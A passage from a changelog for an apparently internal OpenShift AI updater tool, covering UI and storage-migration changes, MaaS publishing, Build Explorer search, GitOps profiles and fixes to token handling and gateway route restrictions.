  to each part's menu. "Delete" replaces "Tear down" and "Remove".
- **Using what was set up.** Pipelines: where the runs are, the pipeline
  server's API endpoint and a KFP SDK snippet. MLflow: workspaces
  explained, a project picker, Open MLflow in the project's workspace,
  and the client settings (`MLFLOW_TRACKING_URI`,
  `MLFLOW_TRACKING_TOKEN`, `MLFLOW_WORKSPACE`); deploying a PR build
  moved to "Test an MLflow PR build". A "What next" list follows.
- **Sample data and a sample pipeline.** The MLflow tab's Sample data
  adds, per project, MLflow's agent and prompt demo (with Regenerate,
  never Remove), a training experiment with a registered model, an MCP
  server entry and an agent skill, each with its state and where it
  shows in the dashboard; Add all and Remove all are one operation. The
  Pipelines tab's Run a sample pipeline offers a two-step write-and-read
  pipeline as a file, the dashboard's import, and curl commands that
  upload it and start a run with a token of ServiceAccount `pipeline-api`,
  which may only use that pipeline server's API and expires in 15 minutes
  (never your own token): the updater never calls a pipeline server's API,
  so its token never reaches a user's project.
  The Overview and What next point to them once a feature works.
- **Migrate storage** says why at the top of the Pipelines tab, and a
  successful migration ends with its outcome: Delete old storage is a
  separate, later action in the storage's menu.
- Readers see who can help ("ask a cluster-admin") instead of disabled
  changes and key fields. A project deleted elsewhere leaves the picker
  on the next refresh or poll. The Overview's next-step buttons line up
  with the row's text.

- "Open MLflow" uses the address the MLflow operator reports (the MLflow
  CR's `status.url`, on current releases `https://rh-ai.<apps>/mlflow`
  through the data-science gateway). It looked for a Route named `mlflow`,
  which current releases no longer create, so the link was missing; the
  Route is still used on releases whose CR reports no address.
- The update notice's "Release notes" link opens the public GitHub release
  (`.../releases/tag/vX.Y.Z`), the same page the install command downloads
  `install.sh` from. The GitLab release page it linked before redirects
  anyone not signed in to GitLab to the sign-in page.
- **New look: PatternFly 6.7's felt theme**, with an appearance button in
  the masthead (it replaces the moon icon). **Color scheme**: System,
  Light or Dark; **Contrast mode**: System, Default, High contrast or
  Glass (on narrow screens, in the user menu). System follows the
  operating system live: dark mode, "increase contrast" (high contrast)
  and "reduce transparency" (the solid default instead of glass). Glass and high contrast never combine; high contrast
  wins. The choice is kept in the browser; a light or dark choice made
  with the old moon icon carries over. The theme is applied before the
  first paint by a small script file, so the page does not flash, and the
  Content-Security-Policy stays `default-src 'self'` (no inline script).
- **Test resources is now the Environment page**: one-click setups for
  developing and reproducing issues on the cluster. Its address stays
  `/test-resources`, so bookmarks and links keep working. One tab per
  feature after an **Overview**, kept in the address (`?tab=pipelines&project=<name>`,
  `?tab=mlflow`; links to the earlier `?tab=cluster` and `?tab=projects` open
  Pipelines), so links, reloads and back and forward open the same view:
  - **Overview**: "N of M ready" and one row per feature with what it
    gives you, its state and the next step (**Open**, **Set up**, **Show
    issue**). A project-scoped feature summarises its projects ("Ready in
    juntao-test", "Ready in 2 of 5 projects"). The state comes from the
    same function the feature's tab uses, so the two cannot disagree.
  - **Pipelines**: S3 storage (cluster) and the project's pipeline server,
    each with its health, its actions and its details inline: the S3
    endpoint, the bucket and the admin UI login, with the password masked
    behind an eye toggle and a copy button. **Set up** confirms every change
    and then sets up the missing parts in order with their progress. **What
    this creates** is collapsed under the parts; Delete and Repair are in
    each part's menu, and Clean up is at the bottom of the tab. Without
    a project in the address it opens the first project with a ready
    pipeline server.
  - **MLflow**: the MLflow server with Open MLflow, Deploy PR and Revert.
  - Health and ownership are separate: the status is health only (Not set
    up, Setting up, Ready, Needs attention, Error, Deleting, Unknown), and
    something this tool did not create gets a **Not managed by this tool**
    label beside it. It can be Ready and counts as ready; it only gets no
    Delete or Repair. The status also reports the health of pipeline
    servers this tool did not create.
- The admin UI password is read from the server only when you show or copy
  it, instead of an `oc extract` command on the page. Only cluster-admins
  get it; it is never part of the status, never cached and never logged,
  and it is gone when you hide it or leave the tab.
- **Delete** of the S3 storage can also delete namespace `seaweedfs`
  ("Also delete namespace seaweedfs (created by this tool)"): offered only
  when the namespace carries the tool label and the tool wrote it,
  unticked, with what it deletes and what the tool sees there. Needs the
  template's new `delete` on namespace `seaweedfs` (SECURITY.md).
- Pipelines tab: clearing the project picker clears the project (the
  address keeps an empty `project=`), so the picker and the parts show
  the same; reload keeps it, back restores the project.
- Migrate storage's "other keys" refusal names the ways forward by hand.
- New pipeline servers wait until Migrate storage has copied the old
  storage: the copy's check compares both sides, and a server writing to the
  new storage first would make it fail. Migrate storage tells you to run
  Migrate storage again when its setup step stops (it said "re-run setup").
  A failed run shows its reason once, and the removal's "Also delete
  namespace minio" choice sits above the data-loss notice.
- **S3 storage in its own namespace, with SeaweedFS names**: namespace
  `seaweedfs`, Service `seaweedfs-s3` (S3 on 8333, admin UI on 12535),
  Secret `seaweedfs-s3-credentials` with the standard keys
  `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY`, PVC `seaweedfs-data`,
  Route `seaweedfs-admin`. New pipeline servers use
  `seaweedfs-s3.seaweedfs.svc:8333`. SeaweedFS 4.48 → 4.54, pinned by
  digest; its admin UI runs on 12535 with the compatibility listener on
  23646 turned off. `SEAWEEDFS_ACCESS_KEY_ID` and
  `SEAWEEDFS_SECRET_ACCESS_KEY` set the keys of a first setup;
  `MINIO_ROOT_USER`, `MINIO_ROOT_PASSWORD` and `MINIO_IMAGE` are no longer
  read.
- **Migrate storage** moves the storage an earlier version set up in
  namespace `minio` (MinIO, or SeaweedFS behind the MinIO-era names) to
  namespace `seaweedfs`, with its data: it sets up the new storage with new
  keys, copies every bucket and object with an rclone Job and checks
  each byte (any difference stops it), and moves the pipeline servers this
  tool created to the new storage and its keys, waiting until each reaches
  it. Anything else that used the old keys needs the new ones, which the
  Pipelines tab shows. The old
  storage is removed only in a separate, confirmed last step, after a
  checklist for references the tool did not create; deleting namespace
  `minio` (and everything in it) is a separate, unticked choice, offered
  when it carries the tool's label.
  Each run resumes where the last stopped, the removal too: it deletes the
  old server last among what can fail, and once the server is gone a
  re-run finishes without copying again. Until then the S3 storage
  reads **Needs attention**, with a warning at the top of the Pipelines
  tab that offers Migrate storage and the old storage's objects under
  **Storage of an earlier version**, and the in-place MinIO-to-SeaweedFS replacement of 2.x is
  retired. `RCLONE_IMAGE` overrides the pinned rclone 1.76.0 image.
- The appearance popover follows a Contrast mode change: it stayed 8 px
  off its button (glass has a narrower masthead inset) until the next
  status refresh. Its last line names each choice that follows the system
  ("Color scheme follows the system: Dark.").
- Status page, Cluster setup: **Replace token** of the pull secret is a
  button like **Test with Quay** next to it, outlined in red because it
  overwrites a credential that may work, with PatternFly's normal spacing
  between the two (one action group) instead of the wide gap between
  groups. It opens the form, the confirmation step, and hides while the
  form is open; the form ends with **Replace token** (red, enabled once a
  token is pasted) and **Cancel**. Focus moves to the token field, and
  back to **Replace token** on Cancel.
- **Reinstall is now "Install a different build"** (Status → Recovery),
  named by what it does: it uninstalls the operator and installs the build
  you choose, the GA release, any nightly build (older ones too) or a
  custom catalog image; it is also the last resort when Update and
  Re-deploy cannot recover the operator. Its button reads **Choose a
  build...**, the form's choice **Install**, and the confirmation asks you
  to type `install`. Messages, the activity log, help and docs use the new
  name; the API and metrics names stay.
- Rows in cards (Recovery, Environment, Cluster setup) are separated by
  equal space above and below each divider.
- The pull secret form is a standard form: the field is labelled **Auth
  token for quay.io/rhoai**, and where to get the token and where it is
  saved are its helper text.
- The appearance popover's arrow points at the appearance button.
- Action rows use one PatternFly action group each, so related actions get
  the standard spacing: the Environment cards' rows (Open admin UI,
  Migrate storage, Repair, Set up, Open MLflow, Open pipelines) and the
  Status page's installed-build actions.
- The installed-build actions on the Status page are full-size buttons in
  one row: **Choose another build** is a secondary button and **View build
  contents** a link button, next to the main action (for example **Update
  to latest**). They were inline links, which sat higher than the button.

### Fixed

- **Self-managed OpenShift: the nodes' pull secret.** Only hosted control
  planes (ROSA HCP) pass `kube-system/additional-pull-secret` to the nodes;
  a self-managed cluster's nodes pull with `openshift-config/pull-secret`.
  The Pull secret item said Ready there, and Update then failed with
  "Replacement catalog validation failed ... ErrImagePull ... (Setup step
  1)". The app now reads the control plane topology (Infrastructure
  `cluster`). On a self-managed cluster, or one whose topology it cannot
  read, once the token is saved the item says **Nodes not checked** and
  shows the `oc` command a cluster-admin runs to add only the
  `quay.io/rhoai` entry to `openshift-config/pull-secret` (the token is
  typed at a silent prompt, never written to disk; the app gets no access
  to that Secret), and **Check that the nodes can pull**, which runs
  Update's own catalog check with a temporary CatalogSource and removes it.
  The catalog pull error of Update, Install a different build and the
  check names the pull secret the nodes use; Diagnostics' Pull secret check
  warns with the command; the setup instructions show the `oc`
  ImageDigestMirrorSet on self-managed clusters; the Update dialog's node
  check runs the real pull check there. The gitops profile's pull error no
  longer points to a setup it does not have. New RBAC: `get` on
  Infrastructure `cluster` (SECURITY.md).
- `install.sh uninstall` and `make undeploy` read the namespaces of the
  Roles and RoleBindings from the template they install, instead of a fixed
  list that missed `openshift-ingress-operator` (template revision 5): its
  Role and RoleBinding were left behind. If the template cannot be
  rendered, nothing is deleted.
- **MaaS: a published model routes through the MaaS gateway only.**
  Earlier builds of 3.0.0 kept it on the inference gateway too, and every
  call to its direct address then failed with 500: maas-controller's
  rate-limit policy applies to the model's route on every gateway, and the
  inference gateway's callers have no MaaS subscription. Publish now
  records the model's gateway refs and sets `maas-default-gateway` alone,
  then waits for KServe to move the model's route ("Partly published" with
  the reason when it does not); Unpublish writes the recorded refs back and
  refuses, before changing anything, when someone added a gateway to the
  model meanwhile. While published, the model is used through MaaS (API
  key) and the dashboard's playground; its direct address answers 404,
  which the publish dialog says before you confirm, and the Models tab
  shows the MaaS commands instead of the direct curl. A publication by an
  earlier build shows as "Partly published": Unpublish, then Publish
  again; a gateway someone added to a published model shows as "Partly
  published" too, with the remedy Unpublish gives when it refuses (set the
  model's gateways without the MaaS gateway, then Unpublish). Each chat model of the catalog has its own recorded refs (by
  project and model) and its own route. New RBAC: `get` on the chat
  models' HTTPRoutes `smollm2-135m-instruct-kserve-route`,
  `qwen25-05b-instruct-kserve-route` and `qwen3-1-7b-kserve-route`
  (SECURITY.md).

- In **Install a different build**, each choice's description touched the
  next choice: the choices were not inside a form, and PatternFly sets
  the space between stacked choices only on forms. The choices, the build
  fields and the **Install...** button are now one form.

- Links to the RHOAI dashboard (the app launcher's **RHOAI dashboard**,
  Dashboard Dev's **Open the dashboard**, a pipeline server's **Open
  pipelines**) went to the retired `rhods-dashboard-redhat-ods-applications`
  host, which on current releases only shows "OpenShift AI has a new
  address", or, in the launcher, to a host guessed from the console's.
  They now use the address the Dashboard component CR reports
  (`status.url`, for example `https://rh-ai.<apps domain>`, the same as
  the OpenShift ConsoleLink), at whichever API version is served. Releases
  without it fall back to the `rhods-dashboard` Route (Dashboard Dev and
  pipeline links); the launcher, which the gitops profile shows too and
  whose RBAC has no Route read, then shows no dashboard item rather than a
  guess. No RBAC change.
- Re-running a setup (Repair) on objects an earlier version created could
  never remove a field or list item the tool stopped setting: the create
  (a POST) left an `Update` entry of the tool in `managedFields` that kept
  owning it. Repairing a SeaweedFS from 2.3.x failed with 422 "ports[2].name:
  Duplicate value: admin". Before updating its own object, setup now moves
  the tool's field ownership to server-side apply (the `csaupgrade`
  semantics `kubectl apply --server-side` uses; other managers' entries are
  untouched).
- A setup the API server rejects part-way no longer leaves the cluster
  half-changed: the S3 storage and pipeline server setups send every create
  and update as a server-side dry run first and make none unless all pass.
  While the admin UI moves to its new port, the NetworkPolicy allows the old
  and the new port until SeaweedFS is ready and `minio-service` follows, so
  the admin UI is never blocked while the old pod still serves it.

### Security

- **MaaS on an older or older-style platform.** Publish refuses on
  Connectivity Link 1.4.0 (it silently bypasses gateway authentication,
  per the MaaS docs) and, while other MaaSSubscriptions exist, below 1.5;
  this tool's subscription (every signed-in user) takes a priority below
  every other subscription, so a key minted without naming one never goes
  to it; gateway policies on `maas-default-gateway` that maas-controller
  does not manage (a tier-based MaaS left them) hold publishing back, and
  the gateway's authentication is judged by maas-controller's own
  AuthPolicy, not the first one found; a `maas-default-gateway` someone
  else made that admits every namespace is not published through (the
  tab shows the patch). Refusals name the part that blocks. The
  infrastructure namespace deadlock is gone (RHOAI creates it only once
  MaaS is on; setup now creates it, as the docs' script does), and the
  CloudNativePG check no longer misses an operator that is not installed.
- **Your own token never goes to a model or a pipeline server** (final
  review). Those run in projects whose editors control what answers at
  their addresses. The Models tab shows commands only for this tool's model
  with its own token Secret (no `oc whoami -t` fallback, none for a model
  this tool did not set up; **Set up again to create its token** for one
  without). The sample pipeline commands and the KFP snippet make
  ServiceAccount `pipeline-api` with a Role for that pipeline server's API
  only and a 15-minute token. SECURITY.md has a new section, "Which token
  is used where", which also explains why a MaaS API key is still minted
  with your token through the MaaS gateway (RHOAI's design).
- Publish refuses a model whose spec was changed since this tool set it
  up (image, model URI, preset, command, environment; an editor could do
  that before a cluster-admin publishes it);
  MaaS setup and publish refuse a `models-as-a-service` or infrastructure
  namespace a user made with a project request (MaaS adopts it); the MLflow
  and dashboard addresses in copied commands are single-quoted and must be
  plain https addresses. SECURITY.md corrects what a leaked ServiceAccount
  token can do with Secrets (mint any ServiceAccount's token), why the
  model token Role passes the escalation check, and the `list gateways`
  check, and documents the SeaweedFS admin Route's unauthenticated
  `/metrics`.
- **Inference gateway: only the projects on its list.** The gateway this
  tool creates accepted routes from every namespace (`from: All`, the RHOAI
  chart's default until August 2026), so a route in any project with a
  model's exact path took over that model's calls and its callers' tokens
  (confirmed live). Both listeners now list the projects they allow by
  name, as RHOAI documents the gateway (`allowedRoutes` `from: Selector`,
  `kubernetes.io/metadata.name In [...]`): the gateway's own namespace and
  each project a model is set up in, added before the model is created. A
  model deployed elsewhere (in the dashboard, say) in a project not on the
  list never becomes ready; the Models tab and the Overview name it, with
  **Allow <project>**. A gateway an earlier build made gets the list at its
  next change, with the projects of this tool's own models on it; other
  projects with models there are named with **Allow <project>** (anyone
  who can edit an allowed project can attach routes to the gateway, so a
  dummy LLMInferenceService no longer gets its project listed). Someone
  else's
  gateway is not changed: the tab says which projects it allows and gives
  RHOAI's step for a cluster admin.
- The MLflow samples and the playground no longer follow HTTP redirects
  with the app's token: a 3xx answer is reported as an error that says
  where it pointed.
- MaaS tab, Authorino TLS commands: the certificate Secret's name read from
  Authorino's CR must be a valid Kubernetes name, or no commands are shown
  and the tab says why; every substitution is shell-quoted.
- **S3 storage migration: the tool's own namespace only, and new keys.**
  Namespace `minio` counts as an earlier version's storage only when the
  namespace shows the tool made it (its label, or the earliest versions'
  POST without a project requester), so `oc new-project minio` with planted
  objects is ignored and shown as not this tool's. Migrate storage gives the
  new storage new keys and gives them to the pipeline servers it moves; the
  old keys are used only by the copy Job, through a Secret the Job owns
  (`seaweedfs-migrate-source`, one new RBAC rule).
- Copy-paste commands: addresses from the cluster (a model's address, a
  pipeline server's API, the MaaS address) are single-quoted, and the server
  shows only plain https addresses, saying why when it hides one.

## [2.3.3] - 2026-11-16

### Fixed

- Local development (`dev.sh`): the webpack dev server gzipped the proxied
  API responses, which buffered the streamed progress of an operation until
  it ended, so the page showed "Update: starting" for the whole update.
  Compression is now off for the dev server; the deployed app has no such
  proxy and was not affected.

- OpenShift 5 clusters: the oauth-proxy image is now pulled from the
  `openshift5` registry namespace instead of `openshift4`, matching the
  cluster's major version. On OpenShift 5 the `openshift4` path has no
  matching tag, so the proxy pod stayed in `ImagePullBackOff` and the app
  never started. Detection still honours an explicit `OAUTH_PROXY_IMAGE`,
  and 4.x clusters are unchanged.

### Security

- Go 1.27.4 (CI, the image build and the GitHub workflows): fixes the
  net/http advisory GO-2026-6859 that govulncheck reports with 1.27.3.

## [2.3.2] - 2026-11-06

2.3.1 was tagged with the same fix but never published: a clock-dependent
test failed its pipelines. Its GitLab tag remains; there is no 2.3.1 image
or installer.

### Fixed

- A Build Explorer test expected "Committed 3w ago" of a fixed date and
  started failing a month later; it now accepts any age.

- The 3.7 builds were missing from the Status page, the Build Explorer and
  the update check: the tag scan read at most 30 pages of the registry's
  tag list from each of a few fixed start points, and 3,600 per-commit tags
  (`rhoai-3.6-<sha>`, `rhoai-3.6-ea.N-<sha>`) had come to lie between
  `rhoai-3.5` and `rhoai-3.7-ea.1`, with no start point between them. The
  list is in a locale order that ignores punctuation, so no cursor can skip
  a version's block reliably either. The release tags are now found by
  asking the registry whether each name exists (`HEAD manifests/<tag>`):
  the minors of each major in batches (a minor counts when its GA tag or
  its first EA exists), then each minor's EAs and patches, stopping after a
  run of misses. A few hundred small requests per scan, cached for five
  minutes as before, and a version is never skipped however many commit
  tags surround it. A probe that found a tag also caches its digest.

## [2.3.0] - 2026-10-30

### Added

- Dashboard Dev shows the commit of every PR or main build and its distance
  from upstream `main`: `GET /api/dashboard/builds` reads each running
  image's labels (anonymously; `quay.io/opendatahub` is public) for its
  commit, build date and repository, asks GitHub how the commit relates to
  the branch it tracks (`opendatahub-io/odh-dashboard` `main` for a main
  build, the PR's head commit for a PR build) and resolves the tag the build
  was deployed from. The containers card shows the short commit as a link,
  "built"/"committed" times, and a chip: *Up to date with main*, *N commits
  behind main* with a Compare link, *Not on main*, *Latest commit of PR #N*,
  *PR #N has M newer commits*, *PR #N merged*, or *Distance from main
  unknown* with the reason. When the tag has moved on, the card lists the
  newer build and a notice above it says to deploy again; the existing
  Deploy actions pick it up. The route is separate from the polled state
  because registry and GitHub reads take seconds; GitHub answers are cached
  (compare of two SHAs for good, `main`'s head for 5 minutes, a tag's digest
  for a minute) and a rate limit leaves the distance unknown with the retry
  time instead of failing. Anonymous GitHub allows 60 requests per hour per
  egress IP; `GITHUB_TOKEN` on the Deployment raises it to 5000. Off in the
  gitops profile like the rest of Dashboard Dev.
- The Build Explorer search takes the URL of a GitHub PR (or `owner/name#N`)
  of any RHOAI component repository, not only `#N` of
  opendatahub-io/odh-dashboard: `GET /api/build-explorer/contains` takes a
  `repo` of `opendatahub-io`, `red-hat-data-services`, `kubeflow`, `kserve`,
  `trustyai-explainability`, `llm-d`, `feast-dev` or `ray-project` (the
  upstreams the RHOAI forks come from; anything else is a 400, since the
  server asks GitHub with its own token) and finds the build's component
  image by its `git.url` label, the `red-hat-data-services` fork of that name
  (or the repository itself), instead of a fixed image name. A fork that
  cherry-picks or rebases upstream changes has different commit SHAs, so a
  PR it took that way shows as *Does not contain* (forks of one GitHub
  network resolve each other's SHAs, so the compare answers); *Unknown
  (commit not on GitHub)* only appears for a SHA GitHub does not know at all.
- A commit SHA, or the URL of a GitHub commit, is searched by containment,
  like a PR: the same route takes `commit=` (7 to 40 hex), resolves it on the
  repository and then on the fork (upstream odh-dashboard SHAs exist in the
  fork, which merges `upstream/main`) and compares each build's component
  commit with it. Only when GitHub knows the commit nowhere does the page
  fall back to the old scan for a component image built from exactly that
  commit, and says so. The response describes a commit with `commit`,
  `commitDate`, `commitTitle` and `commitURL`.
- The search results start with one sentence: *PR #5123 is in the installed
  build and rhoai-3.6.*, *No build contains PR #5123 yet: it was merged 2h
  ago, after the newest build (9h ago).*, *No checked build contains PR
  #5123.* or, when no build could be checked, *Could not tell whether any
  build contains PR #5123.*, with a subtle line for the rest (*Not in
  rhoai-3.5 and rhoai-3.4. 4 older builds were built before the merge. 3
  builds could not be checked (GitHub rate limit).*). A commit's title is on
  the header line (*Commit 6c8ac6e: Show the model deployment status.
  Committed 1d ago in opendatahub-io/odh-dashboard.*).
- `/builds?q=<text>` runs that search once the builds are listed, again when
  the URL changes while the page is open, and submitting a search writes it
  to the URL, so a search can be shared. The Status page's `?image=` link
  keeps working.
- Dashboard Dev's containers card links each PR or main build's commit to
  the Build Explorer search for it (*Find in nightlies*), as the commit's
  GitHub URL, so the search knows the repository.

- When no nightly contains a PR or commit, the Build Explorer explains why
  in plain words under *Why no nightly has it yet*: for odh-dashboard, the
  road a change travels (`main` → the `stable` branch, updated in batches →
  Red Hat's copy, red-hat-data-services/odh-dashboard → the release branch →
  the nightly) and whether `stable` has the change yet, with its last update
  time (one branch read and one compare, cached); for other components, that
  nightlies come from Red Hat's copy of the repository, which takes upstream
  changes on its own schedule. The "how contains is decided" popover and the
  README say the same without assuming the reader knows the repositories.

### Changed

- A nightly pushed more than an hour before the PR was merged (or before the
  searched commit) cannot contain it, so the search answers it from the
  build's date label alone: *Does not contain, built before the merge*, with
  no catalog or GitHub read. The hour allows for clock differences between a
  committer's machine and the registry. The page does the same for the
  builds whose date it already has, without a request. A PR search over 25
  builds now reads only the builds newer than the merge.
- The image label cache holds 10000 entries instead of 2000 (25 builds x
  165 images), so a search over every build stays warm.
- Wording: the commit search's finished line no longer says that later builds
  also contain the commit; a build whose component image has no commit label
  names that image; the help popover and the placeholder (*Image, commit SHA,
  PR # or PR URL*) list what can be searched. The results table's third
  column is *Commit in build* (the component is named in the header popover),
  the search field is wide enough for its placeholder on desktop, and the
  installed build is "the installed build" in sentences.

- Deploy latest main writes the build under its commit tag,
  `quay.io/opendatahub/<repo>:<commit tag>@sha256:...`, so the page and
  `oc get deploy` name the commit instead of a tag that moves dozens of
  times a day. Both pipelines publish such a tag next to the floating one:
  Konflux tags every push build with the full 40-hex commit (next to
  `odh-stable`, the RHOAI build) and OpenShift CI's postsubmit mirrors `main`
  to `main-<first 7 hex of the commit>` (the ODH build); the same scheme holds
  for every module repository. Deploy reads the resolved digest's commit
  label and checks that the commit tag exists for the same digest; without a
  commit label, without the tag, or when it has moved, the floating tag is
  kept as before. The session still records the floating tag, so the page
  keeps saying "Latest main". PR builds keep their `odh-pr-<N>`/`pr-<N>` tag.
- The image label reader falls back from `git.url` to `vcs-url` and
  `io.openshift.build.source-location` (the OpenShift CI images have no
  `git.url`); `org.opencontainers.image.revision` is never read, since on
  those images it is not the source commit.

### Fixed

- The Components page showed a dash instead of a commit for the MLflow
  server: its Deployment names `quay.io/opendatahub/mlflow:odh-stable`, a
  floating tag of an ODH repository, and labels were read only for `rhoai/`
  images pinned by digest. Labels are now read for ODH images too, from the
  digest a running pod reports when the Deployment names a tag. An image
  whose registry read failed or timed out was never asked about again until
  Refresh or a reload; the page now asks again, in the background, five
  minutes later. The dash of an image that is not an RHOAI or ODH build (the
  dashboard redirect's UBI nginx) says so in its tooltip instead of "Not
  recorded in the image labels".
- An ODH (OpenShift CI) build showed the wrong build date and version:
  "built 20h ago · committed 4h ago" on Dashboard Dev, and `9.8` as a
  version on Components, because those images carry the UBI base image's
  `build-date` and `version` labels. For an image with an
  `io.openshift.build.commit.id` label the build date is now the image
  config's `created` time and no version is shown.
- A Dashboard Dev PR build (RHOAI flavour) showed *Distance from PR
  unknown: opendatahub-io/odh-dashboard has no pull request*, because the
  image's `git.url` label names the branch's repository, the contributor's
  fork, and the PR was looked up there. PR builds are now compared in
  upstream `opendatahub-io/odh-dashboard`, where the PR and its commits
  live. An ODH (OpenShift CI) PR build has no commit label at all (the
  `vcs-ref` is empty on PR builds, not on main builds); the card says so
  instead of "The image has no commit label."
- The Components row of a Deployment with several containers described the
  first one: `rhods-dashboard` showed the kube-rbac-proxy sidecar's image
  and commit. The row now describes the container named like the
  Deployment, else the first container that is not a known sidecar.
- The Status page could show an old "latest nightly" on the first load after
  hours without a poll (a closed tab, an expired session) until the next poll
  or a click on Refresh: the latest-build comparison was served from the cache
  whatever its age while a refresh ran in the background. A comparison older
  than five minutes is now looked up before answering, with the same timeout
  and error handling as a first poll; entries between one and five minutes
  old are still served while they refresh.
- docs/GITOPS.md said Renovate's `helm-values` manager does not read the
  chart's image values and sketched a regex manager for them, which would
  track each image twice: the manager reads any string under a key ending in
  `image` (`parameters.IMAGE`, `parameters.OAUTH_PROXY_IMAGE`,
  `gitops.cliImage`). Section 3 now shows ai-grid-tenant's setup: the
  `helm-values` manager for the images (with a pattern for
  `values-<cluster>.yaml`), a regex manager only for the chart's
  `targetRevision` by GitHub releases, one group for the chart and its
  image, and digest-only updates for the oauth-proxy and CLI images.

## [2.2.0] - 2026-10-27

### Added

- A Helm chart, `deploy/chart`, so Argo CD can deploy the updater from a
  GitOps repository at a release tag ([docs/GITOPS.md](docs/GITOPS.md)). It
  renders `deploy/template.yaml` itself (a copy in the chart, checked by
  `make check-chart`, CI and the release guard), so the template stays the
  only definition of the app's objects. Hooks replace `install.sh`'s
  imperative steps: a Sync hook Job creates the cookie Secret once and never
  replaces it, a PostSync hook Job adds the ConsoleLink. Every image is
  pinned by digest in Git (the updater, oauth-proxy and the hook image); an
  image without a digest, an unknown or misspelled value, or an image tag
  that names another release than the chart's fails the render. That last
  check compares the tag only: docs/GITOPS.md says how to check the digest's
  commit.
- Template parameter `INSTALL_METHOD` (empty by default; the chart sets
  `gitops`), passed to the app: on a GitOps install the "vX.Y.Z is
  available" and "deployment is out of date" notices and the help dialog say
  to change the chart's `targetRevision` and image in Git instead of running
  `install.sh`. `GET /api/version` reports it as `installMethod`. Older
  templates lack it and keep the `install.sh` wording, so
  `TEMPLATE_REVISION` stays 4.
- `make chart`, `make check-chart` and `make test-chart`
  (`scripts/test-chart.sh`), and a `chart` job in GitLab CI and GitHub
  Actions with Helm v3.22.1, checked by SHA-256.
- The release guard also checks that `deploy/chart/Chart.yaml` names the
  release (`version` X.Y.Z, `appVersion` vX.Y.Z), and the release notes name
  the chart.
- Profiles ([docs/GITOPS.md, section 11](docs/GITOPS.md#11-profiles)):
  setting `PROFILE` (Template parameter, empty = `full`) picks what the
  updater may do; any other value than `full` or `gitops` stops it at
  startup, and `GET /api/version` reports it as `profile`. `full` is every
  feature, unchanged. `gitops`, for clusters where Argo CD manages RHOAI,
  allows only Update (its Argo CD path: install the build the Git-managed
  catalog serves; refused unless Argo CD manages CatalogSource
  `rhoai-catalog-dev`), its dry run, and the Status, Components and
  Diagnostics reads, which then need cluster-admin like every change. Every
  other route answers 403 `profile_gitops` before any API call; the UI hides
  those pages and actions and says why. In that profile Update never creates
  the operator namespace or OperatorGroup and never ends a Dashboard Dev
  session; it refuses instead.
- The chart's `profile` value, `gitops` by default: it renders the
  Template's objects without its RBAC plus `deploy/rbac-gitops.yaml`, the
  RBAC the gitops profile reaches and nothing more (cluster-wide reads only;
  no Secret, Deployment, namespace, webhook, CatalogSource or OperatorGroup
  writes), and a ValidatingAdmissionPolicy that lets the updater's
  ServiceAccount write only Subscription `rhods-operator` from
  `rhoai-catalog-dev` with at most the environment variables of
  `gitops.subscriptionEnvAllowlist` (default `DISABLE_DSC_CONFIG`) in
  `spec.config`, approve or delete only rhods-operator InstallPlans, delete
  only rhods-operator CSVs, and no CatalogSource or OperatorGroup. In that
  profile Update reads the build from the catalog Git manages instead of a
  temporary verification catalog, checks before deleting anything that the
  policy allows the Subscription it creates and the one it would restore,
  and runs only while the policy and its binding are exactly this
  release's, rendered with the pod's settings (checked at startup, every
  minute, before each Update and before its first deletion; 503
  `admission_policy_missing` otherwise). The gitops profile needs OpenShift
  4.17 or later. `profile: full` renders as before. Tests derive the RBAC
  from a call graph of the gitops routes, prove no catalog write is
  reachable, and evaluate the policy's CEL with cel-go (a new test-only
  dependency, `github.com/google/cel-go`) on shared cases next to the Go
  rule. `TEMPLATE_REVISION` stays 4: the full profile's template RBAC is
  unchanged, the new Template parameter `SUBSCRIPTION_ENV_ALLOWLIST` and
  variable `GITOPS_ADMISSION_POLICY` are read only in the gitops profile,
  and an install without `PROFILE` runs the full profile.
- A nightly catalog that an ACM policy enforces counts as managed, as one
  Argo CD tracks does: `config-policy-controller` owns its `f:spec` in
  `managedFields` (read from the same GET; no new RBAC). Both profiles leave
  it as the policy sets it and install the build it serves; the gitops
  profile runs on it; messages and the Status page name the policy.
  `GET /api/status` reports `catalogSource.managedByACM`.

### Changed

- The chart deploys only on clusters that run RHOAI: with `profile: gitops`
  its RBAC has a Role in RHOAI's operator namespace, so a sync fails where
  that namespace does not exist. docs/GITOPS.md (sections 5 and 9) and the
  chart's values say so, and how an ApplicationSet selects only such
  clusters.
- The gitops profile never contacts Quay, another registry or GitHub, and
  reads no Secret: every page's build information comes from the cluster
  ([docs/GITOPS.md](docs/GITOPS.md#no-registry-access)). The dry run's
  version check uses the head the catalog serves (PackageManifest); the
  Status page's *Latest* row says a newer nightly arrives as a change in
  Git (no Quay lookup, no 401); Components shows the operator build from
  the installed CSV and no image labels, and takes DSC defaults from the
  CSV's `alm-examples` only; Diagnostics has no pull-secret check; the
  updater's own release check is off (`pinnedInGit`; the chart pins it in
  Git). Update and its dry run no longer read
  `kube-system/additional-pull-secret`: they say the cluster's own pull
  secrets are used, and the Status page shows the secret as *Not used*.
  `deploy/rbac-gitops.yaml` renders its Role in `kube-system` with no rules,
  under the name `install.sh` used, so moving an install to Argo CD removes
  `install.sh`'s Secret grant; Diagnostics reports (with
  SelfSubjectAccessReviews) when the ServiceAccount can still read Secrets. A test on the
  profile's reference graph fails when anything it reaches sends a request
  to another host than the API server. The full profile is unchanged.

### Fixed

- Recovery after a failed Update, Reinstall or Re-deploy deleted whatever
  operator Subscription it found. It now deletes only the one the operation
  applied (its UID, from the apply's answer), and leaves a replacement, and
  the CSVs installed for it, alone and reports it.
- Update's managed path (Argo CD or an ACM policy sets the catalog, both
  profiles) read the head to check from the catalog's PackageManifest,
  which can still describe the previous catalog right after Git changes the
  image. After a rollback in Git, the downgrade check could pass and OLM
  install the older build. The recreated Subscription now pins
  `startingCSV` to the checked head, and the restore pins the removed CSV,
  so OLM installs exactly those or nothing (`resolution_failed`).
- Update under Argo CD: when someone replaced the operator Subscription
  just before Update deleted it, Update left the replacement alone, but its
  automatic restore then deleted the replacement and re-applied the old
  Subscription. The restore now leaves it alone too and reports it.

## [2.1.0] - 2026-10-14

### Added

- Clusters where Argo CD (OpenShift GitOps) manages RHOAI. The tool notices
  Argo CD's tracking annotation on the nightly CatalogSource, the operator
  Subscription and the DataScienceCluster, and works with Git as the source
  of truth (RUNBOOK §13; no change to the Argo CD Application is needed):
  - Git picks the build: the catalog image stays as Git sets it. The Status
